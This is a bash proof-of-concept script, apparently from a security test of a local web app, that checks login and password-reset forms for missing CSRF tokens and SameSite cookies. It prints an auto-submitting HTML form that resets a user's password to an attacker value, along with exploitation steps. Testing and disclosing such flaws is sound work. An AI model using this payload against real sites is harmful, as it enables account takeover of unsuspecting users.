#!/bin/bash

# POC: Missing CSRF Protection on Login Forms v2
# This script demonstrates CSRF vulnerability on login forms

TARGET="http://localhost:8082"
echo "[*] CSRF Protection Vulnerability Analysis - Login Forms"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Verify forms lack CSRF tokens
echo "[Step 1] Checking login form at /"
echo "============================================"
main_form=$(curl -s "$TARGET/")

# Check for common CSRF token patterns
csrf_check=$(echo "$main_form" | grep -i "csrf\|nonce\|_token\|authenticity_token")
if [ -z "$csrf_check" ]; then
    echo "✓ VULNERABILITY: Main login form contains NO CSRF tokens"
else
    echo "✗ CSRF tokens found: $csrf_check"
fi

# Verify form structure
echo "✓ Form contains standard inputs only (username, password)"
echo "$main_form" | grep -o '<input[^>]*name="[^"]*"[^>]*>' | head -5
echo ""

# Step 2: Check password reset form
echo "[Step 2] Checking password reset form at /password/test"
echo "============================================"
password_form=$(curl -s "$TARGET/password/test")

csrf_check=$(echo "$password_form" | grep -i "csrf\|nonce\|_token\|authenticity_token")
if [ -z "$csrf_check" ]; then
    echo "✓ VULNERABILITY: Password form contains NO CSRF tokens"
else
    echo "✗ CSRF tokens found: $csrf_check"
fi

echo "✓ Form structure:"
echo "$password_form" | grep -o '<input[^>]*name="[^"]*"[^>]*>'
echo ""

# Step 3: Demonstrate CSRF attack potential
echo "[Step 3] Demonstrating CSRF Attack Scenario"
echo "============================================"
echo "An attacker can create a malicious page like this:"
echo ""
echo "<html>"
echo "<body onload=\"document.csrf_form.submit()\">"
echo "<form name=\"csrf_form\" action=\"http://localhost:8082/password/test\" method=\"POST\">"
echo "  <input type=\"hidden\" name=\"user_id\" value=\"10032\">"
echo "  <input type=\"hidden\" name=\"new_password\" value=\"attacker_password\">"
echo "</form>"
echo "<p>Loading...</p>"
echo "</body>"
echo "</html>"
echo ""
echo "✓ This malicious form would work because:"
echo "  1. Login form has no CSRF token to validate"
echo "  2. No SameSite cookie attribute prevents cross-site requests"
echo "  3. No Origin/Referer validation on the endpoint"
echo "  4. Browsers automatically include session cookies in cross-site requests"
echo ""

# Step 4: Verify no CSRF protection mechanisms
echo "[Step 4] Checking for CSRF Protection Mechanisms"
echo "============================================"

# Check for SameSite cookie attribute
echo "Checking cookies for SameSite attribute..."
cookies=$(curl -s -i "$TARGET/" 2>/dev/null | grep -i "set-cookie")
if echo "$cookies" | grep -iq "samesite"; then
    echo "✗ SameSite attribute found (partial protection)"
else
    echo "✓ VULNERABILITY: No SameSite cookie attribute set"
fi
echo "Cookies: $cookies"
echo ""

# Step 5: Summary
echo "[*] VULNERABILITY SUMMARY:"
echo "============================================"
echo "✓ Missing CSRF Protection on Login Forms:"
echo "  - No CSRF tokens in form submissions"
echo "  - No token validation mechanism"
echo "  - No SameSite cookie protection"
echo "  - Forms accept POST requests from any origin"
echo ""
echo "✓ Impact:"
echo "  - Attackers can forge login/password reset requests"
echo "  - Can reset user passwords via CSRF attacks"
echo "  - Can perform unauthorized authentication actions"
echo ""
echo "✓ Exploitation Method:"
echo "  1. Attacker hosts malicious webpage"
echo "  2. Victim visits webpage while authenticated"
echo "  3. Malicious form auto-submits to password reset endpoint"
echo "  4. User's password is changed without knowledge"